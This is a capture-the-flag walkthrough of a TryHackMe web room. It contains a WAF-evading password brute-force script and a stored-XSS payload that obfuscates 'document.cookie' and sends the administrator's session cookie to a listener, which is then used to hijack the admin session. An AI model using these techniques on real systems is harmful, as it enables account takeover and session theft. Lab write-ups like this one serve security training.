@@ -1,0 +1,232 @@
+1. Reconnaissance
+
+Farewell is a medium-difficulty TryHackMe room focused on exploiting weaknesses in a Web Application Firewall (WAF).
+
+The attack path consists of:
+
+1. Enumerating the exposed services and web application.
+2. Identifying valid application usernames.
+3. Recovering a user's password by bypassing the WAF's request filtering.
+4. Using the authenticated account to submit content reviewed by the administrator.
+5. Exploiting a Stored XSS vulnerability.
+6. Obtaining the administrator's session cookie.
+7. Reusing the stolen session to access the administrator panel.
+
+I started with a full TCP scan and basic service enumeration:
+ nmap -p- -sC -sV 10.113.129.14
+
+The scan revealed two interesting services:
+ 22/tcp  open  ssh
+ 80/tcp  open  http
+
+The web server was running Apache on Ubuntu, so I moved on to the HTTP service.
+The website presented a simple login page. Above the form, a scrolling element exposed several usernames.
+
+I also inspected the page source, which confirmed the usernames:
+ adam
+ deliver11
+ nora
+
+Testing these usernames against the login form produced a useful difference in the application's responses. Known usernames generated a different error from completely invalid usernames.
+This confirmed that the application leaked username validity through its responses.
+
+I also tested admin and confirmed that it was treated as a valid account.
+
+---------------            ---------------            ---------------            ---------------            ---------------            ---------------                                                                   
+
+2. Directory Enumeration
+
+I used dirsearch:
+ dirsearch -u http://10.113.129.14 
+
+Among the discovered resources was:
+ /admin.php
+
+
+This endpoint presented a dedicated administrator login interface.
+At this point, the attack surface became clearer: we had several valid usernames, an administrator endpoint, and a WAF protecting the authentication functionality.
+
+---------------            ---------------            ---------------            ---------------            ---------------            ---------------                                                                   
+
+3. Obtaining User Access
+
+The next objective was to obtain access to one of the regular accounts.
+I intercepted the authentication request with Burp Suite and examined the server's response.
+An interesting parameter called password_hint was returned by the application.
+The hints were different for each account, including:
+ deliver11 → Capital of Japan followed by 4 digits
+
+This immediately made deliver11 the most attractive target.
+The capital of Japan is Tokyo, giving us the following password pattern:
+ Tokyo####
+
+where #### represents four digits.
+
+That leaves only 10,000 possible combinations.
+
+---------------            ---------------            ---------------            ---------------            ---------------            ---------------                                                                   
+
+4. Generating the Candidate Passwords
+
+First, I generated the possible passwords:
+ seq -w 0 9999 | awk '{print "Tokyo"$1}' > wordlist.txt
+
+This produced candidates ranging from:
+ Tokyo0000
+ Tokyo0001
+ Tokyo0002
+ ...
+ Tokyo9999
+
+---------------            ---------------            ---------------            ---------------            ---------------            ---------------                                                                   
+
+5. Custom Brute-Force Script
+
+Python Script: 
+-----------------------------------------------------------------------------------------------
+import requests
+import random
+import time
+import string
+
+URL = "http://10.113.129.14/auth.php"
+USER = "deliver11"
+WORDLIST = "wordlist.txt"
+
+COOKIE = { "PHPSESSID": "a793fdm52po5ies47r8h4a885z" }
+
+def rand_str(n=5):
+    return ''.join(random.choice(string.ascii_letters) for _ in range(n))
+
+def spray():
+    with open(WORDLIST) as f:
+        passwords = [p.strip() for p in f]
+
+    random.shuffle(passwords)   
+
+    for password in passwords:
+
+        target = f"{URL}?v={random.randint(1000,9999)}"
+
+        data = f"username={USER}&password={password}&z={rand_str(4)}"
+
+        base_headers = [
+            ("User-Agent", f"Mozilla/5.0 ({rand_str(6)})"),
+            ("Accept", "*/*"),
+            ("Referer", f"http://10.113.129.14/?t={rand_str(3)}"),
+            ("Content-Type", "application/x-www-form-urlencoded"),
+            ("Origin", "http://10.113.129.14"),
+            ("Connection", "keep-alive"),
+        ]
+
+        random.shuffle(base_headers)
+        headers = {k: v for k, v in base_headers}
+
+        r = requests.post(target, headers=headers, data=data, cookies=COOKIE)
+
+
+        if r.status_code == 403:
+            print("\n[!] HARD BLOCK — STOPPING.")
+            return
+
+        if "auth_failed" not in r.text:
+            print("\n[+] SUCCESS:", password)
+            return
+
+
+if __name__ == "__main__":
+    spray()
+-----------------------------------------------------------------------------------------------
+
+Running the script:
+ python3 brute.py
+
+eventually revealed the correct password for deliver11.
+I then logged into the application using the recovered credentials.
+After authentication, the application redirected me to:
+ /dashboard.php
+
+The dashboard contained the first flag.
+
+---------------            ---------------            ---------------            ---------------            ---------------            ---------------                                                                   
+
+6. From User to Administrator
+
+After obtaining regular-user access, I inspected the functionality available on the dashboard.
+One feature allowed me to submit a message that would later be reviewed by the administrator.
+This immediately suggested a possible Stored XSS attack.
+
+The important detail was that the submitted content was subsequently rendered in an administrator context.
+If JavaScript could execute there, it might be possible to access the administrator's session.
+
+---------------            ---------------            ---------------            ---------------            ---------------            ---------------                                                                   
+
+7. Testing for XSS
+
+I first tried a standard payload:
+ <script>alert(1)</script>
+
+The payload was blocked by the WAF.
+Instead of immediately trying random payloads, I started identifying which parts of the HTML/JavaScript syntax were being filtered.
+
+One useful test was an external resource request:
+ <img src="http://10.113.129.14:8000">
+
+I started a simple HTTP server:
+ python3 -m http.server 8000
+
+When the administrator viewed the submitted content, the server received an incoming request.
+That confirmed that the HTML was being rendered by the administrator's browser and that external resources could be loaded.
+This was a strong indication that the filtering could potentially be bypassed to achieve JavaScript execution.
+
+---------------            ---------------            ---------------            ---------------            ---------------            ---------------                                                                   
+
+8. WAF Behavior
+
+Further testing revealed several useful restrictions:
+ `<script>` elements were filtered.
+ Direct use of `cookie` was blocked.
+ Some event handlers behaved differently depending on the HTML element being used.
+
+The goal was therefore to execute JavaScript without using the obvious signatures that the WAF was looking for.
+
+I used an alternative HTML element with an event handler:
+ <iframe onload="new Image().src='http://10.113.129.14:8000/?x='+document['coo'+'kie']"></iframe>
+
+The interesting part is:
+ document['coo'+'kie']
+
+Instead of writing:
+ document.cookie
+
+the property name is constructed dynamically.
+
+At runtime, JavaScript evaluates:
+ 'coo' + 'kie'
+as:
+ cookie
+
+This allowed the browser to access the cookie while avoiding a simple WAF signature looking specifically for the literal string document.cookie.
+
+I then started another listener:
+ python3 -m http.server 8000
+
+After the administrator processed the message, an HTTP request arrived at my server containing the administrator's session information.
+The captured value corresponded to the administrator's PHPSESSID.
+
+---------------            ---------------            ---------------            ---------------            ---------------            ---------------                                                                   
+
+9. Session Hijacking
+
+The application used the PHP session identifier to maintain authentication.
+Since the initial Nmap scan had already indicated that the PHPSESSID cookie did not have the HttpOnly attribute, client-side JavaScript could access it.
+I opened the browser's developer tools and navigated to the site's stored cookies.
+The current session contained a PHPSESSID belonging to my regular user account.
+I replaced that value with the session identifier obtained from the administrator's browser.
+After refreshing the page, the application treated my browser as the administrator's session.
+
+I then requested:
+ http://10.113.129.14/admin.php
+
+The administrator panel was now accessible without knowing the administrator's password.
+The second flag was available inside the admin interface.
